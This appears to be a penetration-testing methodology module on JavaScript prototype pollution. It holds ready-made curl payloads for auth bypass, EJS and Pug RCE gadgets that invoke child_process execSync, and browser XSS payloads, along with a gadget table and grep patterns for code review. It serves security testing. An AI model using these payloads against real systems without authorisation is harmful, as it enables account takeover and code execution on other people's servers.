# VULN MODULE — Prototype Pollution
# Asset: webapp (Node.js / JavaScript applications)
# Append to asset/webapp/module.md when target uses Node.js or client-side JS
# Report ID prefix: WEB-PP

## THREAT MODEL

JavaScript's prototype chain means that polluting Object.prototype
injects properties into EVERY object in the runtime.

Server-side (Node.js):
  - Polluting __proto__ → affects all objects application-wide
  - Can bypass authentication checks (if (user.isAdmin) → true after pollution)
  - Can escalate to RCE via gadget chains in template engines, child_process, etc.
  - Persists for the lifetime of the Node.js process (affects all users)

Client-side (browser):
  - Pollution via URL parameters, JSON, localStorage
  - Escalates to XSS via DOM gadgets (innerHTML, document.write fed by polluted prop)
  - Affects only the current browser tab/session

## VULNERABILITY CLASSES

1. Server-Side PP → RCE via template engine    CWE-1321  — Critical
2. Server-Side PP → Auth bypass                CWE-1321  — High
3. Server-Side PP → DoS via property injection CWE-1321  — Medium
4. Client-Side PP → XSS via DOM gadget         CWE-1321  — High
5. Client-Side PP → Logic bypass               CWE-1321  — Medium

## WHITEBOX STATIC ANALYSIS

```bash
# Unsafe merge / clone / extend functions (the root cause)
grep -rn "merge(\|extend(\|assign(\|defaults(\|clone(\|deepMerge(\|deepExtend(" \
  --include="*.js" --include="*.ts"
# For each hit: does it recursively process __proto__ or constructor keys?

# Direct prototype assignment sinks
grep -rn "__proto__\|\[.constructor.\]\|\[.prototype.\]" \
  --include="*.js" --include="*.ts"

# lodash — vulnerable versions use _.merge, _.defaultsDeep, _.set with user input
grep -rn "require.*lodash\|from.*lodash\|_\.merge\|_\.defaultsDeep\|_\.set" \
  --include="*.js" --include="*.ts"
# Check lodash version in package.json — vulnerable: < 4.17.21

# Template engines used (gadget chains)
grep -rn "require.*pug\|require.*ejs\|require.*handlebars\|require.*nunjucks\|require.*jade" \
  --include="*.js" --include="*.ts"
# These are known gadget sources for PP→RCE

# child_process usage near object merging (RCE gadget)
grep -rn "child_process\|spawn(\|exec(" --include="*.js" --include="*.ts"

# Object.assign with user-controlled source
grep -rn "Object\.assign(\|Object\.merge(" --include="*.js" --include="*.ts"

# JSON.parse of user input feeding into merge
grep -rn "JSON\.parse.*req\.\|JSON\.parse.*body\.\|JSON\.parse.*query\." \
  --include="*.js" --include="*.ts"
```

## BLACKBOX TESTING

### Step 1 — Detect vulnerable merge via HTTP parameters

```bash
# Test JSON body — send __proto__ key
curl -s -X POST https://target.com/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}'

# Verify pollution persisted
curl -s https://target.com/api/debug \
  -H 'Content-Type: application/json' \
  -d '{}'
# If response contains "polluted":"yes" → confirmed server-side pollution
```

### Step 2 — Auth bypass via pollution

```bash
# Attempt to inject isAdmin into all objects
curl -s -X POST https://target.com/api/profile \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true,"role":"admin","authorized":true}}'

# Then try accessing admin endpoint
curl -s https://target.com/api/admin/users \
  -H 'Cookie: session=REGULAR_USER_SESSION'
# If 200 returned → auth bypass confirmed
```

### Step 3 — RCE via template engine gadget chain

```bash
# EJS gadget (Node.js EJS template engine)
curl -s -X POST https://target.com/api/render \
  -H 'Content-Type: application/json' \
  -d '{
    "__proto__": {
      "outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id > /tmp/pwned\");x"
    }
  }'
# Verify: check if /tmp/pwned was created (via another endpoint or timing)

# Pug gadget
curl -s -X POST https://target.com/api/render \
  -H 'Content-Type: application/json' \
  -d '{
    "__proto__": {
      "compileDebug": true,
      "self": true,
      "block": "process.mainModule.require(\"child_process\").execSync(\"id\")"
    }
  }'

# Handlebars gadget
# Requires knowing template name — use introspection or error messages
```

### Step 4 — Client-side PP → XSS

```javascript
// In browser console, test URL parameter pollution
// URL: https://target.com/page?__proto__[innerHTML]=<img src=x onerror=alert(1)>

// Or via postMessage
window.postMessage(JSON.stringify({
  "__proto__": { "innerHTML": "<img src=x onerror=alert(document.domain)>" }
}), "*");

// Check: does any DOM element get its innerHTML set from Object properties?
```

## GADGET CHAIN REFERENCE

| Template Engine | Gadget Property | Outcome |
|---|---|---|
| EJS | `outputFunctionName` | RCE via function name injection |
| Pug | `compileDebug` + `self` | RCE via debug output |
| Handlebars | `pending` | RCE via template compilation |
| Nunjucks | `tags` | RCE via custom tag handler |
| `child_process` direct | `shell` | RCE if spawn used nearby |

## TOOLS

```bash
# PPScan — automated client-side PP detection
npm install -g @nicolo-ribaudo/ppmap
ppmap https://target.com/page

# server-side-prototype-pollution npm package (for testing your own code)
npm install --save-dev server-side-prototype-pollution

# Manual: nodemon + custom payload runner
node -e "
const obj = {};
const payload = JSON.parse('{\"__proto__\":{\"polluted\":true}}');
function merge(a,b){ for(let k in b){ if(typeof b[k]==='object') merge(a[k],b[k]); else a[k]=b[k]; } }
merge(obj, payload);
console.log({}.polluted); // true = vulnerable merge
"
```
